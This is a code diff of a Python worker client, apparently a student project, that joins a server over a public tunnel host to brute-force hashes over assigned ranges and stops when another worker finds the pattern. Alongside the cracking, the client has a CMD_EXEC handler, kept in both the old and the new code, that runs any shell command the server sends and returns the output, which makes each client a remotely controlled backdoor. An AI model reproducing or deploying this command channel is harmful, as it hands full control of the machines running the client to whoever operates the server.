@@ -6,6 +6,8 @@ import json
 import base64
 import os
 import subprocess
+import threading
+import queue
 from pathlib import Path
 from Function_Net.recieving import receive_and_decompress_file
 import hashlib
@@ -14,7 +16,14 @@ from OFFLINE_bruteforce.Mohamed import socket_client
 
 HEADER = 64 
 FORMAT = 'utf-8'
-server = "192.168.100.66"
+server = "insqllgrp3.loclx.io"
+
+# Global flags for stopping work
+stop_work_flag = False
+current_hash = None
+stop_lock = threading.Lock()
+message_queue = queue.Queue()  # Queue for passing messages from receiver thread to main thread
+
 #===========colors============#
 
 RED = "\033[91m"
@@ -152,7 +161,6 @@ def receive_message(client_socket):
             chunk = client_socket.recv(chunk_size)
             
             if not chunk:
-                print(f"{RED}Connection closed while receiving message{RESET}")
                 return None
             
             message_data += chunk
@@ -163,55 +171,17 @@ def receive_message(client_socket):
                 progress = (bytes_received / message_length) * 100
                 print(f"\r{BLUE}[*] Receiving file: {progress:.1f}%{RESET}", end="", flush=True)
         
-        print() 
+        if message_length > 1048576:
+            print() 
         return message_data
     
     except socket.timeout:
         return None
-    except ConnectionResetError:
-        # Server forcibly closed the connection (WinError 10054)
-        raise  # Re-raise to be handled by the main loop
-    except ConnectionAbortedError:
-        # Connection was aborted
-        raise  # Re-raise to be handled by the main loop
-    except OSError as e:
-        # Check for connection reset errors (WinError 10054, 10053)
-        if e.winerror in (10054, 10053):
-            raise  # Re-raise to be handled by the main loop
-        print(f"{RED}Error receiving the message: {e}{RESET}")
-        return None
+    except (ConnectionResetError, ConnectionAbortedError, OSError):
+        raise
     except Exception as e:
         print(f"{RED}Error receiving the message: {e}{RESET}")
         return None
-
-def handle_file_message(message_data):
-    try:
-        msg = json.loads(message_data.decode(FORMAT))
-        
-        if msg.get("type") == "file_archive":
-            filename = msg.get("filename", "received_file")
-            encoded_data = msg.get("data", "")
-            
-            result = receive_and_decompress_file(encoded_data, filename, output_dir="logs/files")
-            
-            if result['success']:
-                print(f"\n{GREEN}┌{'─'*78}┐{RESET}")
-                print(f"{GREEN}│{RESET} {BLUE}✓ FILE RECEIVED{RESET}                                                          {GREEN}│{RESET}")
-                print(f"{GREEN}├{'─'*78}┤{RESET}")
-                print(f"{GREEN}│{RESET}   File:   {YELLOW}{filename:<60}{RESET} {GREEN}│{RESET}")
-                print(f"{GREEN}│{RESET}   Size:   {YELLOW}{result['original_size']} bytes{' '*(48-len(str(result['original_size'])))}{RESET} {GREEN}│{RESET}")
-                print(f"{GREEN}│{RESET}   Location: {YELLOW}{result['path']:<54}{RESET} {GREEN}│{RESET}")
-                print(f"{GREEN}└{'─'*78}┘{RESET}")
-                return True
-            else:
-                print(f"{RED}Error receiving file: {result['message']}{RESET}")
-                return False
-    except json.JSONDecodeError:
-        print(f"{RED}Error decoding file message{RESET}")
-        return False
-    except Exception as e:
-        print(f"{RED}Error handling file: {e}{RESET}")
-        return False
 
 def get_system_info():
     ##------CPU Info------##
@@ -248,14 +218,35 @@ def brute_force_discovery(hash_value, start_range, end_range, length=6):
     # NOTE: The actual character set used must match the one used by the dispatcher.
     CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789"
     
+    # Helper function to convert index to pattern
+    def index_to_pattern(index, length):
+        pattern = ""
+        temp_i = index
+        for _ in range(length):
+            pattern = CHARACTERS[temp_i % len(CHARACTERS)] + pattern
+            temp_i //= len(CHARACTERS)
+        return pattern
+    
+    start_pattern = index_to_pattern(start_range, length)
+    end_pattern = index_to_pattern(end_range, length)
+    
     print(f"{BLUE}    [TASK] Starting discovery for hash: {hash_value[:16]}...{RESET}")
-    print(f"{BLUE}    [TASK] Range: {start_range} to {end_range} | Length: {length}{RESET}")
+    print(f"{BLUE}    [TASK] Range: {start_range:,} to {end_range:,} | Length: {length}{RESET}")
+    print(f"{GREEN}    [TASK] Pattern range: {start_pattern} to {end_pattern}{RESET}")
     
     total_iterations = end_range - start_range + 1
     log_interval = max(1, total_iterations // 100)  # Log every 1%
     
     # Simple, non-recursive brute force for fixed length
     for i in range(start_range, end_range + 1):
+        # Check if we should stop (another client found the pattern)
+        with stop_lock:
+            should_stop = stop_work_flag
+        
+        if should_stop:
+            print(f"\n{YELLOW}    [STOPPED] Work stopped - pattern found by another worker{RESET}")
+            return None
+        
         pattern = ""
         temp_i = i
         
@@ -278,6 +269,58 @@ def brute_force_discovery(hash_value, start_range, end_range, length=6):
     
     print(f"\n{RED}    [DONE] Pattern not found in range {start_range}-{end_range}{RESET}")
     return None # Pattern not found in this chunk
+
+def message_receiver_thread(client):
+    """Background thread to continuously receive ALL messages from server"""
+    global stop_work_flag, current_hash
+    
+    while True:
+        try:
+            message_data = receive_message(client)
+            
+            if not message_data:
+                continue
+                
+            message_str = message_data.decode(FORMAT)
+            
+            try:
+                broadcast_msg = json.loads(message_str)
+                msg_type = broadcast_msg.get("type")
+                
+                if msg_type == "STOP_WORK":
+                    hash_value = broadcast_msg.get("hash")
+                    found_by = broadcast_msg.get("found_by")
+                    pattern = broadcast_msg.get("pattern", "unknown")
+                    
+                    # Set global stop flag with thread safety
+                    with stop_lock:
+                        if current_hash == hash_value:
+                            stop_work_flag = True
+                    
+                    print(f"\n{GREEN}┌{'─'*78}┐{RESET}")
+                    print(f"{GREEN}│{RESET} {BLUE}🎉 PATTERN FOUND BY ANOTHER WORKER{RESET}                                      {GREEN}│{RESET}")
+                    print(f"{GREEN}├{'─'*78}┤{RESET}")
+                    print(f"{GREEN}│{RESET}   Found by: {YELLOW}{found_by:<60}{RESET} {GREEN}│{RESET}")
+                    print(f"{GREEN}│{RESET}   Pattern: {YELLOW}{pattern:<61}{RESET} {GREEN}│{RESET}")
+                    print(f"{GREEN}│{RESET}   Stopping local work...{' '*49}{RESET} {GREEN}│{RESET}")
+                    print(f"{GREEN}└{'─'*78}┘{RESET}")
+                
+                elif msg_type in ["BROADCASTING", "CMD_EXEC"]:
+                    # Put work messages in queue for main thread to process
+                    message_queue.put((msg_type, broadcast_msg))
+                    
+            except json.JSONDecodeError:
+                pass
+                
+        except socket.timeout:
+            continue
+        except (ConnectionResetError, ConnectionAbortedError, OSError):
+            message_queue.put(("CONNECTION_CLOSED", None))
+            break
+        except Exception as e:
+            print(f"{RED}[ERROR] Message receiver thread: {e}{RESET}")
+            break
+
 
 if __name__ == "__main__":
     print("═" * 80)
@@ -316,207 +359,149 @@ if __name__ == "__main__":
         print("\nConnection established. Client is now registered with the server.")
         print("Press Ctrl+C to disconnect...\n")
         
+        # Start background thread to receive ALL messages
+        receiver_thread = threading.Thread(target=message_receiver_thread, args=(client,), daemon=True)
+        receiver_thread.start()
         
         while True:
             try:
-                message_data = receive_message(client)
+                # Get message from queue (with timeout to allow KeyboardInterrupt)
+                try:
+                    msg_type, msg_data = message_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
                 
-                # if message_data:
-                #     handle_file_message(message_data)
-                if message_data:
-                    message_str = message_data.decode(FORMAT)
-                    
-                    # Try to parse as JSON first (new format with hash)
-                    try:
-                        broadcast_msg = json.loads(message_str)
-                        if broadcast_msg.get("type") == "BROADCASTING":
-                            hash_value = broadcast_msg.get("hash_value")
-                            entry_id = broadcast_msg.get("entry_id", "unknown")
-                            
-                            # Get the worker_id from socket_client module
-                            worker_id = socket_client.client_id
-                            print(f"{BLUE}[*] Starting worker with ID: {worker_id}{RESET}")
-                            print(f"{YELLOW}[*] Received hash to crack: {hash_value} (Entry: {entry_id}){RESET}")
-                            
-                            # Send worker_id to server
-                            worker_info = json.dumps({"type": "WORKER_ID", "worker_id": worker_id})
-                            worker_info_bytes = worker_info.encode(FORMAT)
-                            worker_info_length = len(worker_info_bytes)
-                            send_length = str(worker_info_length).encode(FORMAT)
-                            send_length += b' ' * (HEADER - len(send_length))
-                            client.send(send_length)
-                            client.send(worker_info_bytes)
-                            
-                            # Send status update to server (WORKING)
-                            status_msg = json.dumps({"type": "STATUS", "status": "WORKING", "worker_id": worker_id})
-                            status_bytes = status_msg.encode(FORMAT)
-                            status_length = len(status_bytes)
-                            send_length = str(status_length).encode(FORMAT)
-                            send_length += b' ' * (HEADER - len(send_length))
-                            client.send(send_length)
-                            client.send(status_bytes)
-                            
-                            # Run brute force discovery with the received hash
-                            print(f"{BLUE}[*] Worker with ID: {worker_id} is now working...{RESET}")
-                            result = brute_force_discovery(hash_value, 0, 90000000, length=6)
-                            
-                            # Send result back to server
-                            if result:
-                                print(f"{GREEN}[*] Worker with ID: {worker_id} found the pattern: {result}{RESET}")
-                                result_msg = json.dumps({"type": "RESULT", "status": "CRACKED", "pattern": result, "worker_id": worker_id, "hash": hash_value})
-                            else:
-                                print(f"{YELLOW}[*] Worker with ID: {worker_id} did not find pattern in range.{RESET}")
-                                result_msg = json.dumps({"type": "RESULT", "status": "NOT_FOUND", "worker_id": worker_id, "hash": hash_value})
-                            
-                            result_bytes = result_msg.encode(FORMAT)
-                            result_length = len(result_bytes)
-                            send_length = str(result_length).encode(FORMAT)
-                            send_length += b' ' * (HEADER - len(send_length))
-                            client.send(send_length)
-                            client.send(result_bytes)
-                            
-                            # Send status update to server (IDLE)
-                            status_msg = json.dumps({"type": "STATUS", "status": "IDLE", "worker_id": worker_id})
-                            status_bytes = status_msg.encode(FORMAT)
-                            status_length = len(status_bytes)
-                            send_length = str(status_length).encode(FORMAT)
-                            send_length += b' ' * (HEADER - len(send_length))
-                            client.send(send_length)
-                            client.send(status_bytes)
-                            
-                            print(f"{GREEN}[*] Worker with ID: {worker_id} has completed its task.{RESET}")
-                            continue
-                        
-                        elif broadcast_msg.get("type") == "CMD_EXEC":
-                            command = broadcast_msg.get("command")
-                            print(f"{BLUE}[*] Received command: {command}{RESET}")
-                            
-                            try:
-                                # Execute command
-                                if command.lower().startswith("cd "):
-                                    # Handle directory change
-                                    try:
-                                        target_dir = command[3:].strip()
-                                        os.chdir(target_dir)
-                                        output = f"Changed directory to {os.getcwd()}"
-                                    except Exception as e:
-                                        output = str(e)
-                                else:
-                                    # Execute shell command
-                                    process = subprocess.Popen(
-                                        command, 
-                                        shell=True, 
-                                        stdout=subprocess.PIPE, 
-                                        stderr=subprocess.PIPE,
-                                        stdin=subprocess.PIPE
-                                    )
-                                    stdout, stderr = process.communicate()
-                                    output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
-                                
-                                if not output:
-                                    output = "[Command executed successfully with no output]"
-                                    
-                            except Exception as e:
-                                output = f"Error executing command: {str(e)}"
-                            
-                            # Send output back
-                            response = json.dumps({
-                                "type": "CMD_OUTPUT", 
-                                "output": output,
-                                "cwd": os.getcwd()
-                            })
-                            
-                            response_bytes = response.encode(FORMAT)
-                            response_length = len(response_bytes)
-                            send_length = str(response_length).encode(FORMAT)
-                            send_length += b' ' * (HEADER - len(send_length))
-                            client.send(send_length)
-                            client.send(response_bytes)
-                            continue
-                            
-                    except json.JSONDecodeError:
-                        pass
-                    
-                    # Fallback for old format (plain "BROADCASTING" string)
-                    if message_str == "BROADCASTING":
-                        # Get the worker_id from socket_client module
-                        worker_id = socket_client.client_id
-                        print(f"{BLUE}[*] Starting worker with ID: {worker_id}{RESET}")
-                        
-                        # Send worker_id to server
-                        worker_info = json.dumps({"type": "WORKER_ID", "worker_id": worker_id})
-                        worker_info_bytes = worker_info.encode(FORMAT)
-                        worker_info_length = len(worker_info_bytes)
-                        send_length = str(worker_info_length).encode(FORMAT)
-                        send_length += b' ' * (HEADER - len(send_length))
-                        client.send(send_length)
-                        client.send(worker_info_bytes)
-                        
-                        # Send status update to server (WORKING)
-                        status_msg = json.dumps({"type": "STATUS", "status": "WORKING", "worker_id": worker_id})
-                        status_bytes = status_msg.encode(FORMAT)
-                        status_length = len(status_bytes)
-                        send_length = str(status_length).encode(FORMAT)
-                        send_length += b' ' * (HEADER - len(send_length))
-                        client.send(send_length)
-                        client.send(status_bytes)
-                        
-                        # Run brute force with default hash
-                        print(f"{BLUE}[*] Worker with ID: {worker_id} is now working...{RESET}")
-                        result = brute_force_discovery('4773a5f2a66b3d29393803ba631c3491', 0, 100000, length=6)
-                        
-                        if result:
-                            print(f"{GREEN}[*] Worker with ID: {worker_id} found the pattern: {result}{RESET}")
-                        else:
-                            print(f"{YELLOW}[*] Worker with ID: {worker_id} did not find pattern in range.{RESET}")
-                        
-                        # Send status update to server (IDLE)
-                        status_msg = json.dumps({"type": "STATUS", "status": "IDLE", "worker_id": worker_id})
-                        status_bytes = status_msg.encode(FORMAT)
-                        status_length = len(status_bytes)
-                        send_length = str(status_length).encode(FORMAT)
-                        send_length += b' ' * (HEADER - len(send_length))
-                        client.send(send_length)
-                        client.send(status_bytes)
-                        
-                        print(f"{GREEN}[*] Worker with ID: {worker_id} has completed its task.{RESET}")
-                    
-            except socket.timeout:
-                continue
-            except (ConnectionResetError, ConnectionAbortedError):
-                # Server disconnected us gracefully or forcibly
-                print(f"\n{YELLOW}┌{'─'*78}┐{RESET}")
-                print(f"{YELLOW}│{RESET} {BLUE}ℹ DISCONNECTED BY SERVER{RESET}                                               {YELLOW}│{RESET}")
-                print(f"{YELLOW}├{'─'*78}┤{RESET}")
-                print(f"{YELLOW}│{RESET}   The server has closed the connection.                                  {YELLOW}│{RESET}")
-                print(f"{YELLOW}│{RESET}   This may be due to a server-side disconnect command.                   {YELLOW}│{RESET}")
-                print(f"{YELLOW}└{'─'*78}┘{RESET}")
-                print("\nPress Enter to exit...")
-                input()
-                break
-            except OSError as e:
-                # Check for specific Windows socket errors
-                if hasattr(e, 'winerror') and e.winerror in (10054, 10053):
-                    # 10054 = Connection reset by peer
-                    # 10053 = Connection aborted
+                if msg_type == "CONNECTION_CLOSED":
                     print(f"\n{YELLOW}┌{'─'*78}┐{RESET}")
                     print(f"{YELLOW}│{RESET} {BLUE}ℹ DISCONNECTED BY SERVER{RESET}                                               {YELLOW}│{RESET}")
                     print(f"{YELLOW}├{'─'*78}┤{RESET}")
                     print(f"{YELLOW}│{RESET}   The server has closed the connection.                                  {YELLOW}│{RESET}")
                     print(f"{YELLOW}│{RESET}   This may be due to a server-side disconnect command.                   {YELLOW}│{RESET}")
                     print(f"{YELLOW}└{'─'*78}┘{RESET}")
-                else:
-                    print(f"\n{RED}┌{'─'*78}┐{RESET}")
-                    print(f"{RED}│{RESET} {YELLOW}⚠ CONNECTION ERROR{RESET}                                                     {RED}│{RESET}")
-                    print(f"{RED}├{'─'*78}┤{RESET}")
-                    print(f"{RED}│{RESET}   An unexpected network error occurred.                                  {RED}│{RESET}")
-                    error_str = str(e)[:60]
-                    padding = 63 - len(error_str)
-                    print(f"{RED}│{RESET}   Error: {error_str}{' '*padding}{RED}│{RESET}")
-                    print(f"{RED}└{'─'*78}┘{RESET}")
-                print("\nPress Enter to exit...")
-                input()
-                break
+                    print("\nPress Enter to exit...")
+                    input()
+                    break
+                
+                if msg_type == "BROADCASTING":
+                    stop_work_flag, current_hash
+                    
+                    broadcast_msg = msg_data
+                    hash_value = broadcast_msg.get("hash_value")
+                    entry_id = broadcast_msg.get("entry_id", "unknown")
+                    start_range = broadcast_msg.get("start_range", 0)
+                    end_range = broadcast_msg.get("end_range", 90000000)
+                    pattern_length = broadcast_msg.get("pattern_length", 6)
+                    
+                    # Get the worker_id from socket_client module
+                    worker_id = socket_client.client_id
+                    
+                    # Reset stop flag and set current hash with thread safety
+                    with stop_lock:
+                        stop_work_flag = False
+                        current_hash = hash_value
+                    
+                    print(f"{BLUE}[*] Starting worker with ID: {worker_id}{RESET}")
+                    print(f"{YELLOW}[*] Received hash to crack: {hash_value} (Entry: {entry_id}){RESET}")
+                    print(f"{BLUE}[*] Assigned range: {start_range:,} to {end_range:,} (Length: {pattern_length}){RESET}")
+                    print(f"{BLUE}[*] Total combinations to check: {end_range - start_range + 1:,}{RESET}")
+                    
+                    # Send worker_id to server
+                    worker_info = json.dumps({"type": "WORKER_ID", "worker_id": worker_id})
+                    worker_info_bytes = worker_info.encode(FORMAT)
+                    worker_info_length = len(worker_info_bytes)
+                    send_length = str(worker_info_length).encode(FORMAT)
+                    send_length += b' ' * (HEADER - len(send_length))
+                    client.send(send_length)
+                    client.send(worker_info_bytes)
+                    
+                    # Send status update to server (WORKING)
+                    status_msg = json.dumps({"type": "STATUS", "status": "WORKING", "worker_id": worker_id})
+                    status_bytes = status_msg.encode(FORMAT)
+                    status_length = len(status_bytes)
+                    send_length = str(status_length).encode(FORMAT)
+                    send_length += b' ' * (HEADER - len(send_length))
+                    client.send(send_length)
+                    client.send(status_bytes)
+                    
+                    # Run brute force discovery with the assigned range
+                    print(f"{BLUE}[*] Worker {worker_id} is now working on assigned checkpoint...{RESET}")
+                    result = brute_force_discovery(hash_value, start_range, end_range, length=pattern_length)
+                    
+                    # Send result back to server
+                    if result:
+                        print(f"{GREEN}[*] Worker {worker_id} found the pattern: {result}{RESET}")
+                        result_msg = json.dumps({"type": "RESULT", "status": "CRACKED", "pattern": result, "worker_id": worker_id, "hash": hash_value})
+                    else:
+                        print(f"{YELLOW}[*] Worker {worker_id} completed range {start_range:,}-{end_range:,} - pattern not found{RESET}")
+                        result_msg = json.dumps({"type": "RESULT", "status": "NOT_FOUND", "worker_id": worker_id, "hash": hash_value})
+                    
+                    result_bytes = result_msg.encode(FORMAT)
+                    result_length = len(result_bytes)
+                    send_length = str(result_length).encode(FORMAT)
+                    send_length += b' ' * (HEADER - len(send_length))
+                    client.send(send_length)
+                    client.send(result_bytes)
+                    
+                    # Send status update to server (IDLE)
+                    status_msg = json.dumps({"type": "STATUS", "status": "IDLE", "worker_id": worker_id})
+                    status_bytes = status_msg.encode(FORMAT)
+                    status_length = len(status_bytes)
+                    send_length = str(status_length).encode(FORMAT)
+                    send_length += b' ' * (HEADER - len(send_length))
+                    client.send(send_length)
+                    client.send(status_bytes)
+                    
+                    print(f"{GREEN}[*] Worker {worker_id} has completed its assigned checkpoint.{RESET}")
+                
+                elif msg_type == "CMD_EXEC":
+                    broadcast_msg = msg_data
+                    command = broadcast_msg.get("command")
+                    print(f"{BLUE}[*] Received command: {command}{RESET}")
+                    
+                    try:
+                        if command.lower().startswith("cd "):
+                            try:
+                                target_dir = command[3:].strip()
+                                os.chdir(target_dir)
+                                output = f"Changed directory to {os.getcwd()}"
+                            except Exception as e:
+                                output = str(e)
+                        else:
+                            process = subprocess.Popen(
+                                command, 
+                                shell=True, 
+                                stdout=subprocess.PIPE, 
+                                stderr=subprocess.PIPE,
+                                stdin=subprocess.PIPE
+                            )
+                            stdout, stderr = process.communicate()
+                            output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
+                        
+                        if not output:
+                            output = "[Command executed successfully with no output]"
+                            
+                    except Exception as e:
+                        output = f"Error executing command: {str(e)}"
+                    
+                    # Send output back
+                    response = json.dumps({
+                        "type": "CMD_OUTPUT", 
+                        "output": output,
+                        "cwd": os.getcwd()
+                    })
+                    
+                    response_bytes = response.encode(FORMAT)
+                    response_length = len(response_bytes)
+                    send_length = str(response_length).encode(FORMAT)
+                    send_length += b' ' * (HEADER - len(send_length))
+                    client.send(send_length)
+                    client.send(response_bytes)
+            
+            except KeyboardInterrupt:
+                raise
+            except Exception as e:
+                print(f"{RED}[ERROR] Main loop exception: {e}{RESET}")
+                continue
             
     except ConnectionRefusedError:
         print(f"Failed to connect to {server}:{port}")
@@ -528,7 +513,6 @@ if __name__ == "__main__":
         client.close()
         print("Connection closed.")
         print("\nPress Enter to exit...")
-
         input()
     except Exception as e:
         print(f"An error occurred: {e}")
